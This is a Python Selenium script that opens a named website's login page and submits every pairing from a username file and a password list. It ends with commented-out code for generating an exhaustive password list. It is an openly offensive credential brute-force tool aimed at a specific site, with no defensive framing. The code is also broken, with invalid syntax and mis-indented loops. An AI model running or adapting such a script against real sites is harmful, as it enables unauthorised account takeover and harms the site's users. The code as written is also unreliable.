from selenium import webdriver
import time

def main():
    browser = webdriver.Firefox()

    browser.get('https://www.stins.com/')
    logged = False

    userNameList = [line.rstrip('\n') for line in open('usernames.txt')]
    passwordList = [line.rstrip('\n') for line in open('passlist.txt', encoding='latin-1')]

    while !logged:
        try:
            uName = browser.find_element_by_name('username')
            pWord = browser.find_element_by_name('password')

            for i in range(len(userNameList)):
            currName = userNameList[i]
                for j in range(len(passwordList)):
                    currPassword = passwordList[j]
                    uName.send_keys(currName)
                    pWord.send_keys(currPassword)
                    pWord.submit()
        except:
            print('Already Logged In')
            logged = True
            break

        time.sleep(5)


if __name__ == "__main__":
    main()


# needs work. this section is for making a comprehensive list. gets memory error. The list generated is too long for mem values.
#use a 2 dimensional list or generate password only one time per use.
##    import itertools
##    completeList = []
##    for i in range(5,6):
##        temp = itertools.product('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+-=`~,./;[]\<>?:"{}|',
##                                         repeat=i) # i is the length of your result.
##        for j in temp:
##            #print(''.join(j))
##            completeList.append(''.join(j))
####            for q in range(len(completeList)):
####                print(completeList[q])
##        print(completeList)
####    for i in range(len(completeList)):
####        print(completeList[i])
